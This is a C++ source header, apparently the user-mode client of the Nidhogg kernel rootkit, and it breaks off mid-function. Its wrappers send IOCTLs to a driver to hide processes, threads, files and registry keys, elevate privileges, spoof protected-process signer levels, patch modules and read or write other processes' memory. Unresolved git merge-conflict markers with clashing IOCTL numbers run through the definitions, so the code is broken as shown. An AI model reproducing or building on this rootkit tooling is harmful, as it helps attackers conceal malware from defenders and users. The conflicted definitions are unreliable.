#include <Windows.h>
#include <vector>
#include <string>
#include <sddl.h>
#pragma comment(lib, "advapi32.lib")

<<<<<<< HEAD
<<<<<<< HEAD
// ** IOCTL ************************************************************************************
=======
// ** IOCTL *************************************************************************************************
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
// ** IOCTLS **********************************************************************************************
>>>>>>> a20f2bb (Updated client)
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNHIDE_PROCESS CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

<<<<<<< HEAD
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
=======
#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
<<<<<<< HEAD
>>>>>>> 9256dee (Added ability to query registry, processes and files)
=======

#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
<<<<<<< HEAD
>>>>>>> da4b5b2 (Added patching to the usermode side)
=======
#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
>>>>>>> afd6daf (Nidhogg v0.2)
// *********************************************************************************************************
=======
#define IOCTL_NIDHOGG_PROTECT_THREAD CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_THREAD CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *******************************************************************************************************
>>>>>>> a20f2bb (Updated client)

// ** General Definitions ***************************************************************************************
// ADD THESE DEFINITIONS FOR HKLM, HKU & HKCU: https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/registry-key-object-routines
#define DRIVER_NAME LR"(\\.\Nidhogg)"
#define NIDHOGG_SUCCESS 0
#define NIDHOGG_GENERAL_ERROR 1
#define NIDHOGG_ERROR_CONNECT_DRIVER 2
#define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3
#define NIDHOGG_INVALID_COMMAND 4
#define NIDHOGG_INVALID_OPTION 5

<<<<<<< HEAD
<<<<<<< HEAD
=======
#define MAX_PATCHED_MODULES 256
<<<<<<< HEAD
>>>>>>> da4b5b2 (Added patching to the usermode side)
#define MAX_PIDS 256
#define MAX_FILES 256

<<<<<<< HEAD
=======
>>>>>>> 0a9676d (Pre version 0.1 (#6))
#define REG_TYPE_KEY 0
#define REG_TYPE_VALUE 1
=======
=======
#define MAX_FILES 256

#define PROCESS_TYPE_PROTECTED 0
#define PROCESS_TYPE_SPOOFED 1
#define MAX_PIDS 256
#define MAX_TIDS 256

>>>>>>> afd6daf (Nidhogg v0.2)
#define REG_TYPE_PROTECTED_KEY 0
#define REG_TYPE_PROTECTED_VALUE 1
#define REG_TYPE_HIDDEN_KEY 2
#define REG_TYPE_HIDDEN_VALUE 3
>>>>>>> c5ff028 (Seperated hidden and protected registry items)
#define REG_KEY_LEN 255
#define REG_VALUE_LEN 260
#define HKLM_HIVE LR"(\Registry\Machine)"
#define HKCR_HIVE LR"(\Registry\Machine\SOFTWARE\Classes)"
#define HKU_HIVE LR"(\Registry\User)"
#define HKLM L"HKEY_LOCAL_MACHINE"
#define HKLM_SHORT L"HKLM"
#define HKU L"HKEY_USERS"
#define HKU_SHORT L"HKU"
#define HKCU L"HKEY_CURRENT_USER"
#define HKCU_SHORT L"HKCU"
#define HKCR L"HKEY_CLASSES_ROOT"
#define HKCR_SHORT L"HKCR"

enum class MODE {
	KernelMode,
	UserMode
};

enum SignatureType
{
	PsProtectedTypeNone = 0,
	PsProtectedTypeProtectedLight = 1,
	PsProtectedTypeProtected = 2
};

enum SignatureSigner
{
	PsProtectedSignerNone = 0,      // 0
	PsProtectedSignerAuthenticode,  // 1
	PsProtectedSignerCodeGen,       // 2
	PsProtectedSignerAntimalware,   // 3
	PsProtectedSignerLsa,           // 4
	PsProtectedSignerWindows,       // 5
	PsProtectedSignerWinTcb,        // 6
	PsProtectedSignerWinSystem,     // 7
	PsProtectedSignerApp,           // 8
	PsProtectedSignerMax            // 9
};

// *********************************************************************************************************

// ** General Structures ***************************************************************************************
<<<<<<< HEAD
<<<<<<< HEAD
=======
struct PatchedModule {
	ULONG Pid;
	PVOID Patch;
	ULONG PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

>>>>>>> da4b5b2 (Added patching to the usermode side)
struct ProcessesList {
	int PidsCount;
	ULONG Pids[MAX_PIDS];
};

struct ThreadsList {
	int TidsCount;
	ULONG Threads[MAX_TIDS];
};

struct ProcessSignature {
	ULONG Pid;
	UCHAR SignerType;
	UCHAR SignatureSigner;
};

<<<<<<< HEAD
=======
>>>>>>> 0a9676d (Pre version 0.1 (#6))
=======
struct FileItem {
	int FileIndex;
	WCHAR FilePath[MAX_PATH];
};

>>>>>>> 9256dee (Added ability to query registry, processes and files)
struct RegItem {
	int RegItemsIndex;
	ULONG Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct PkgReadWriteData {
	MODE Mode;
	ULONG Pid;
	SIZE_T Size;
	PVOID LocalAddress;
	PVOID RemoteAddress;
};
// *********************************************************************************************************

std::wstring GetHKCUPath() {
	std::wstring fullUsername = HKU_HIVE;
	WCHAR username[MAX_PATH];
	DWORD usernameSize = MAX_PATH;
	wchar_t* domain;
	SID* sid;
	LPWSTR stringSid;
	SID_NAME_USE sidUse;
	DWORD sidSize = 0;
	DWORD domainSize = 0;

	if (!GetUserName(username, &usernameSize)) {
		return fullUsername;
	}

	if (LookupAccountName(0, username, 0, &sidSize, 0, &domainSize, &sidUse) == 0) {
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			return fullUsername;
	}

	sid = (SID*)LocalAlloc(LMEM_FIXED, sidSize);

	if (sid == 0) {
		return fullUsername;
	}
	domain = (wchar_t*)LocalAlloc(LMEM_FIXED, domainSize);

	if (domain == 0) {
		LocalFree(sid);
		return fullUsername;
	}

	if (LookupAccountName(0, username, sid, &sidSize, (LPWSTR)domain, &domainSize, &sidUse) == 0) {
		LocalFree(sid);
		LocalFree(domain);
		return fullUsername;
	}

	if (!ConvertSidToStringSid(sid, &stringSid)) {
		LocalFree(sid);
		LocalFree(domain);
		return fullUsername;
	}

	LocalFree(sid);
	LocalFree(domain);

	fullUsername.append(L"\\");
	fullUsername.append(stringSid);
	return fullUsername;
}

std::wstring ParseRegistryKey(wchar_t* key) {
	std::wstring result = key;

	if (result.find(HKLM) != std::wstring::npos) {
		result.replace(0, 18, HKLM_HIVE);
	}
	else if (result.find(HKLM_SHORT) != std::wstring::npos) {
		result.replace(0, 4, HKLM_HIVE);
	}
	else if (result.find(HKCR) != std::wstring::npos) {
		result.replace(0, 17, HKCR_HIVE);
	}
	else if (result.find(HKCR_SHORT) != std::wstring::npos) {
		result.replace(0, 4, HKCR_HIVE);
	}
	else if (result.find(HKU) != std::wstring::npos) {
		result.replace(0, 10, HKU_HIVE);
	}
	else if (result.find(HKU_SHORT) != std::wstring::npos) {
		result.replace(0, 3, HKU_HIVE);
	}
	else if (result.find(HKCU) != std::wstring::npos) {
		std::wstring hkcuPath = GetHKCUPath();

		if (hkcuPath.compare(HKU_HIVE) == 0)
			return L"";
		result.replace(0, 17, hkcuPath);
	}
	else if (result.find(HKCU_SHORT) != std::wstring::npos) {
		std::wstring hkcuPath = GetHKCUPath();

		if (hkcuPath.compare(HKU_HIVE) == 0)
			return L"";
		result.replace(0, 4, hkcuPath);
	}
	else {
		return L"";
	}
	return result;
}

namespace Nidhogg {
	namespace ProcessUtils {
		int NidhoggProcessProtect(HANDLE hNidhogg, DWORD pid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_PROCESS,
				&pid, sizeof(pid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggProcessUnprotect(HANDLE hNidhogg, DWORD pid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
				&pid, sizeof(pid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggProcessClearAllProtection(HANDLE hNidhogg) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION,
				nullptr, 0, nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggThreadProtect(HANDLE hNidhogg, DWORD tid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_THREAD,
				&tid, sizeof(tid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggThreadUnprotect(HANDLE hNidhogg, DWORD tid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_THREAD,
				&tid, sizeof(tid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggThreadClearAllProtection(HANDLE hNidhogg) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION,
				nullptr, 0, nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggProcessHide(HANDLE hNidhogg, DWORD pid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_PROCESS,
				&pid, sizeof(pid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggProcessUnhide(HANDLE hNidhogg, DWORD pid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNHIDE_PROCESS,
				&pid, sizeof(pid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggThreadHide(HANDLE hNidhogg, DWORD tid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_THREAD,
				&tid, sizeof(tid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggProcessElevate(HANDLE hNidhogg, DWORD pid) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_ELEVATE_PROCESS,
				&pid, sizeof(pid),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggProcessSetProtection(HANDLE hNidhogg, DWORD pid, UCHAR signerType, UCHAR signatureSigner) {
			DWORD returned;
			ProcessSignature processSignature{};

			processSignature.Pid = pid;
			processSignature.SignerType = signerType;
			processSignature.SignatureSigner = signatureSigner;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL,
				&processSignature, sizeof(processSignature),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		std::vector<DWORD> NidhoggQueryProcesses(HANDLE hNidhogg) {
			DWORD returned;
			ProcessesList result{};
			std::vector<DWORD> pids;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES,
				nullptr, 0,
				&result, sizeof(result), &returned, nullptr)) {

				pids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
				return pids;
			}

			for (int i = 0; i < result.PidsCount; i++) {
				pids.push_back(result.Pids[i]);
			}

			return pids;
		}

		std::vector<DWORD> NidhoggQueryThreads(HANDLE hNidhogg) {
			DWORD returned;
			ThreadsList result{};
			std::vector<DWORD> tids;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS,
				nullptr, 0,
				&result, sizeof(result), &returned, nullptr)) {

				tids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
				return tids;
			}

			for (int i = 0; i < result.TidsCount; i++) {
				tids.push_back(result.Threads[i]);
			}

			return tids;
		}
	}

	namespace FileUtils {
		int NidhoggFileProtect(HANDLE hNidhogg, wchar_t* filePath) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_FILE,
				(PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggFileUnprotect(HANDLE hNidhogg, wchar_t* filePath) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_FILE,
				(PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggFileClearAllProtection(HANDLE hNidhogg) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION,
				nullptr, 0, nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		std::vector<std::wstring> NidhoggQueryFiles(HANDLE hNidhogg) {
			DWORD returned;
			FileItem result{};
			std::vector<std::wstring> files;
			int amountOfFiles = 0;
			result.FileIndex = 0;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_FILES,
				nullptr, 0,
				&result, sizeof(result), &returned, nullptr)) {

				files.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
				return files;
			}

			amountOfFiles = result.FileIndex;

			if (amountOfFiles == 0)
				return files;

			files.push_back(std::wstring(result.FilePath));
			result.FilePath[0] = L'\0';

			for (int i = 1; i < amountOfFiles; i++) {
				result.FileIndex = i;

				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_FILES,
					nullptr, 0,
					&result, sizeof(result), &returned, nullptr)) {

					files.clear();
					files.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
					return files;
				}

				files.push_back(std::wstring(result.FilePath));
				result.FilePath[0] = L'\0';
			}

			return files;
		}
	}

	namespace RegistryUtils {
		int NidhoggRegistryProtectKey(HANDLE hNidhogg, wchar_t* key) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			item.Type = REG_TYPE_PROTECTED_KEY;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryHideKey(HANDLE hNidhogg, wchar_t* key) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			item.Type = REG_TYPE_HIDDEN_KEY;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryProtectValue(HANDLE hNidhogg, wchar_t* key, wchar_t* valueName) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
			item.Type = REG_TYPE_PROTECTED_VALUE;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryHideValue(HANDLE hNidhogg, wchar_t* key, wchar_t* valueName) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
			item.Type = REG_TYPE_HIDDEN_VALUE;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_PROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryUnprotectKey(HANDLE hNidhogg, wchar_t* key) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			item.Type = REG_TYPE_PROTECTED_KEY;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryUnhideKey(HANDLE hNidhogg, wchar_t* key) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			item.Type = REG_TYPE_HIDDEN_KEY;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryUnprotectValue(HANDLE hNidhogg, wchar_t* key, wchar_t* valueName) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
			item.Type = REG_TYPE_PROTECTED_VALUE;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryUnhideValue(HANDLE hNidhogg, wchar_t* key, wchar_t* valueName) {
			DWORD returned;
			RegItem item;

			std::wstring kernelSyntaxRegistryKey = ParseRegistryKey(key);

			if (kernelSyntaxRegistryKey.empty()) {
				return NIDHOGG_GENERAL_ERROR;
			}

			wcscpy_s(item.KeyPath, wcslen(kernelSyntaxRegistryKey.data()) + 1, kernelSyntaxRegistryKey.data());
			wcscpy_s(item.ValueName, wcslen(valueName) + 1, valueName);
			item.Type = REG_TYPE_HIDDEN_VALUE;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_UNPROTECT_REGITEM,
				&item, sizeof(item),
				nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		int NidhoggRegistryClearAll(HANDLE hNidhogg) {
			DWORD returned;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_CLEAR_REGITEMS,
				nullptr, 0, nullptr, 0, &returned, nullptr))
				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

			return NIDHOGG_SUCCESS;
		}

		std::vector<std::wstring> NidhoggRegistryQueryProtectedKeys(HANDLE hNidhogg) {
			RegItem result{};
			std::vector<std::wstring> keys;
			int amountOfKeys = 0;
			DWORD returned;

			result.RegItemsIndex = 0;
			result.Type = REG_TYPE_PROTECTED_KEY;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
				&result, sizeof(result),
				&result, sizeof(result), &returned, nullptr)) {

				keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
				return keys;
			}

			amountOfKeys = result.RegItemsIndex;

			if (amountOfKeys == 0)
				return keys;

			keys.push_back(std::wstring(result.KeyPath));
			result.KeyPath[0] = L'\0';

			for (int i = 1; i < amountOfKeys; i++) {
				result.RegItemsIndex = i;

				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
					nullptr, 0,
					&result, sizeof(result), &returned, nullptr)) {

					keys.clear();
					keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
					return keys;
				}

				keys.push_back(std::wstring(result.KeyPath));
				result.KeyPath[0] = L'\0';
			}

			return keys;
		}

		std::vector<std::wstring> NidhoggRegistryQueryHiddenKeys(HANDLE hNidhogg) {
			DWORD returned;
			RegItem result{};
			std::vector<std::wstring> keys;
			int amountOfKeys = 0;
			result.RegItemsIndex = 0;
			result.Type = REG_TYPE_HIDDEN_KEY;

			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
				&result, sizeof(result),
				&result, sizeof(result), &returned, nullptr)) {

				keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
				return keys;
			}

			amountOfKeys = result.RegItemsIndex;

			if (amountOfKeys == 0)
				return keys;

			keys.push_back(std::wstring(result.KeyPath));
			result.KeyPath[0] = L'\0';

			for (int i = 1; i < amountOfKeys; i++) {
				result.RegItemsIndex = i;

				if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_QUERY_REGITEMS,
					nullptr, 0,
					&result, sizeof(result), &returned, nullptr)) {

					keys.clear();
					keys.push_back(std::to_wstring(NIDHOGG_ERROR_DEVICECONTROL_DRIVER));
					return keys;
				}

				keys.push_back(std::wstring(result.KeyPath));
				result.KeyPath[0] = L'\0';
			}

			return keys;
		}

		std::tuple<std::vector<std::wstring>, std::vector<std::wstring>> NidhoggRegistryQueryProtectedValues(HANDLE hNidhogg) {
			DWORD returned;
			RegItem result{};
			std::vector<std::wstring> values;
			std::vector<std::wstring> valuesKeys;
			int amountOfValues = 0;
			result.RegItemsIndex = 0;
			result.Type = REG_TYPE_PROTECTED_VALUE;

